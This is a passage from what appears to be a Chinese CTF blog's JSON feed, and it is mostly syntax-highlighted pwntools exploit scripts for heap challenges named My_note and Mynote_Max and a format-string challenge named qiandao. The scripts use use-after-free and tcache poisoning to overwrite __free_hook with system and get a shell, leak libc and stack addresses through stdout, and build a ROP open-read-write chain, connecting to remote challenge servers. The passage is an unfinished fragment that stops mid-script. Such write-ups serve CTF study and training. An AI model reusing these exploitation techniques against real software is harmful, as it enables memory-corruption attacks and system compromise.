class=\"token punctuation\">(</span><span class=\"token number\">0x90</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#0</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x90</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x90</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"/bin/sh\\x00\\x00\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\nshow<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\nru<span class=\"token punctuation\">(</span><span class=\"token string\">\"Content: \"</span><span class=\"token punctuation\">)</span>\nleak_heap <span class=\"token operator\">=</span>  u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\\x00\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">\"leak_heap\"</span><span class=\"token punctuation\">,</span>leak_heap<span class=\"token punctuation\">)</span>\n\nshow<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\nru<span class=\"token punctuation\">(</span><span class=\"token string\">\"Content: \"</span><span class=\"token punctuation\">)</span>\nleak_libc <span class=\"token operator\">=</span> l64<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x70</span>\n\nlibc_base <span class=\"token operator\">=</span>leak_libc <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"__malloc_hook\"</span><span class=\"token punctuation\">]</span>\n\n__free_hook <span class=\"token operator\">=</span>libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"__free_hook\"</span><span class=\"token punctuation\">]</span>\n\nsystem <span class=\"token operator\">=</span>libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">]</span>\n\none_gadget <span class=\"token operator\">=</span> one_gad<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span>libc_base\n\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">\"leak_libc\"</span><span class=\"token punctuation\">,</span>leak_libc<span class=\"token punctuation\">)</span>\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">\"libc_base\"</span><span class=\"token punctuation\">,</span>libc_base<span class=\"token punctuation\">)</span>\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">\"__free_hook\"</span><span class=\"token punctuation\">,</span>__free_hook<span class=\"token punctuation\">)</span>\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">,</span>system<span class=\"token punctuation\">)</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>__free_hook<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"a\"</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#dbg()</span>\n\n\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n@File    :   My_note.py\n@Time    :   2021/07/04 22:40:06\n@Author  :   Niyah \n'''</span></code></pre>\n<h1 id=\"mynote_max\"><a class=\"markdownIt-Anchor\" href=\"#mynote_max\">#</a> Mynote_Max</h1>\n<p>在上一题的基础上加了限制，我的做法是直接在栈上构造 orw 链，刚好 9 次 add</p>\n<ol>\n<li>找出存放栈地址的变量</li>\n<li>通过 stdout 输出栈地址</li>\n<li>在栈上构造 orw</li>\n</ol>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- encoding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys \n<span class=\"token keyword\">import</span> os \n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> \n<span class=\"token keyword\">import</span> galatea \ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span> \nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'./Mynote_Max'</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./Mynote_Max'</span><span class=\"token punctuation\">)</span>\n\nlibc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./libc-2.27.so\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#libc = elf.libc</span>\n\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">#p = process(['qemu-aarch64','-L','',binary])</span>\n    <span class=\"token comment\">#p = process(['qemu-aarch64','-L','',-g,'1234',binary])</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    host <span class=\"token operator\">=</span> <span class=\"token string\">'47.99.38.177'</span>\n    port <span class=\"token operator\">=</span> <span class=\"token string\">'10002'</span>\n    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data  <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">': 0x%x'</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrint<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n    pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>choice<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span>choice<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span>content<span class=\"token operator\">=</span><span class=\"token string\">\"aaa\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">)</span>\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x90</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#0</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">4</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"flag\\x00\"</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0xf0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#2</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n\nshow<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n\nru<span class=\"token punctuation\">(</span><span class=\"token string\">\"Content: \"</span><span class=\"token punctuation\">)</span>\nleak_heap <span class=\"token operator\">=</span>  u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\\x00\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">\"leak_heap\"</span><span class=\"token punctuation\">,</span>leak_heap<span class=\"token punctuation\">)</span>\n\n\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\n\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n\nshow<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\nru<span class=\"token punctuation\">(</span><span class=\"token string\">\"Content: \"</span><span class=\"token punctuation\">)</span>\nleak_libc <span class=\"token operator\">=</span> l64<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x70</span>\nlibc_base <span class=\"token operator\">=</span> leak_libc <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"__malloc_hook\"</span><span class=\"token punctuation\">]</span>\n\nenviron <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__environ'</span><span class=\"token punctuation\">]</span>\nstdout <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"_IO_2_1_stdout_\"</span><span class=\"token punctuation\">]</span>\nputs_addr <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"puts\"</span><span class=\"token punctuation\">]</span>\nread_addr <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"read\"</span><span class=\"token punctuation\">]</span>\nflag_addr <span class=\"token operator\">=</span> leak_heap <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x5638eddfd320</span><span class=\"token operator\">-</span><span class=\"token number\">0x5638eddfd260</span><span class=\"token punctuation\">)</span>\n\n\nsyscall <span class=\"token operator\">=</span> <span class=\"token number\">0x000000000011007F</span> <span class=\"token operator\">+</span> libc_base\npop_rax_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x00000000000439c8</span> <span class=\"token operator\">+</span> libc_base\npop_rdi_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x000000000002155f</span> <span class=\"token operator\">+</span> libc_base\npop_rsi_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x0000000000023e6a</span> <span class=\"token operator\">+</span> libc_base\npop_rdx_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x0000000000001b96</span> <span class=\"token operator\">+</span> libc_base\n<span class=\"token comment\">#59</span>\n\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">\"leak_libc\"</span><span class=\"token punctuation\">,</span>leak_libc<span class=\"token punctuation\">)</span>\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">\"libc_base\"</span><span class=\"token punctuation\">,</span>libc_base<span class=\"token punctuation\">)</span>\n\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>stdout<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"a\"</span> <span class=\"token punctuation\">)</span>\n\npayload <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xfbad1800</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>environ<span class=\"token operator\">-</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>environ<span class=\"token operator\">+</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span> payload <span class=\"token punctuation\">)</span>\n\n\nstack_addr <span class=\"token operator\">=</span> l64<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x7ffc1e9c4bf8</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x7ffc1e9c4b18</span><span class=\"token punctuation\">)</span>\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">\"leak_stack\"</span><span class=\"token punctuation\">,</span>stack_addr<span class=\"token punctuation\">)</span>\n\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0xf0</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>stack_addr<span class=\"token operator\">-</span><span class=\"token number\">0x10</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#full</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0xf0</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"a\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#gdb.attach(p,\"b read\")</span>\n\n<span class=\"token comment\">#payload = p64(pop_rdi_ret) + p64(bin_sh) + p64(pop_rsi_ret) + p64(0) + p64(pop_rdx_ret) + p64(0) + p64(pop_rax_ret) + p64(59) +  p64(syscall)</span>\n\npayload_orw <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span>pop_rax_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>flag_addr<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rsi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>syscall<span class=\"token punctuation\">)</span>\n\npayload_orw<span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>pop_rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rsi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>stack_addr<span class=\"token operator\">+</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rdx_ret<span class=\"token punctuation\">)</span>  <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>read_addr<span class=\"token punctuation\">)</span>\n\npayload_orw<span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>pop_rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>stack_addr<span class=\"token operator\">+</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts_addr<span class=\"token punctuation\">)</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0xf0</span><span class=\"token punctuation\">,</span>payload_orw<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#dbg()</span>\n\n<span class=\"token comment\">#delete(3)</span>\n\n\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n\n<span class=\"token triple-quoted-string string\">'''\n@File    :   MyNoteMax.py\n@Time    :   2021/07/05 10:43:30\n@Author  :   Niyah \n'''</span></code></pre>\n",
            "tags": [
                "PWN",
                "堆",
                "UAF",
                "PWNHUB"
            ]
        },
        {
            "id": "http://niyah.cn/CTF/NewCTF/",
            "url": "http://niyah.cn/CTF/NewCTF/",
            "title": "NewCTF",
            "date_published": "2021-06-04T14:10:27.000Z",
            "content_html": "<p>调完了，写的 b 脚本把错误 catch 了一直找不到某个铸币错误，导致调了半天</p>\n<a id=\"more\"></a>\n<h1 id=\"qiandao\"><a class=\"markdownIt-Anchor\" href=\"#qiandao\">#</a> qiandao</h1>\n<p>格式化字符串，写的有点太多了，利用格式化字符串在栈上写 ROP 链</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- coding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys\n<span class=\"token keyword\">import</span> os\n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">from</span> galatea <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token comment\">#context.log_level = 'debug'</span>\n\nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'./qiandao'</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./qiandao'</span><span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\n\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n  p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n  <span class=\"token comment\">#p = process([\"qemu-aarch64\",\"-L\",\"\",binary])</span>\n  <span class=\"token comment\">#p = process([\"qemu-aarch64\",\"-L\",\"\",-g,\"1234\",binary])</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n  host <span class=\"token operator\">=</span> <span class=\"token string\">\"81.68.86.115\"</span>\n  port <span class=\"token operator\">=</span>  <span class=\"token number\">10001</span>\n  p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>     \t<span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"\\x7f\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\\x00\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>     \t<span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"\\xf7\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\\x00\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b  \t<span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b \t<span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">\": 0x%x\"</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload\t<span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>      \t<span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload\t<span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a    \t<span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrint<span class=\"token operator\">=</span> 